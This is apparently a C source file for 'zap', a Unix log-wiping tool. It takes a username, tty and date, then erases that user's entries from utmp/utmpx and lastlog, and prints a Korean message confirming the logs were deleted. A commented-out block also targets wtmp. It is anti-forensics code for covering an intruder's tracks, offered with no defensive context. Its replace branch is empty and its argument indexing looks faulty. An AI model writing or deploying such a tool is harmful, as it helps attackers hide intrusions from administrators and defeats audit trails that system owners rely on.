#include "kill.h"
#define bzero(x, y) memset(x, 0, y)
 
int f;

void usage(){
    printf("usage: zap [-A username] or [-a username -t tty -d mmddyy] or [-R username1 username2 -t tty1 tty2 -d mmddyy1 mmddyy2\n");
}
 
int main(int argc,char *argv[])
{   
    int c;

    while((c=getopt(argc,argv,"A:a:t:d:R:"))!=EOF){
        switch (c)
        {
        case 'A':
            AFlag=1;
            username1=optarg;
            break;
        case 'a':
            aFlag=1;
            username1 = optarg;
            break;
        case 't':
            tty1 = optarg;
            break;
        case 'd':
            mmddyy1 = optarg;
            break;
        case 'R':
            RFlag=1;
            username1 = optarg;
            username2 = argv[optind];

            tty1 = argv[optind+2];
            tty2 = argv[optind+3];

            mmddyy1 = argv[optind+5];
            mmddyy2 = argv[optind+6];

            break;
        case '?':
            printf("unknown flag: %c \n",optopt);
            usage();
            return 0;
            break;
        default:
            usage();
            return 0;
            break;
        }
    }

    if(AFlag==1){
        if(kill_tmp("/var/run/utmpx")==-1) return 0;
        if(kill_lastlog("/var/log/lastlog")==-1) return 0;
        printf("%s의 로그를 지웠습니다\n",username1);
    }else if(aFlag==1){
        if(kill_tmp("/var/run/utmp")==-1) return -1;
    }else if(RFlag==1){
    }

    

    // if (argc==2) {
    //     kill_tmp("/etc/utmp",argv[1]);
    //     kill_tmp("/usr/adm/wtmp",argv[1]);
    //     kill_lastlog(argv[1]);
    //     printf("Zap!\n");
    // } else
    // printf("Error.\n");

    return 0;
}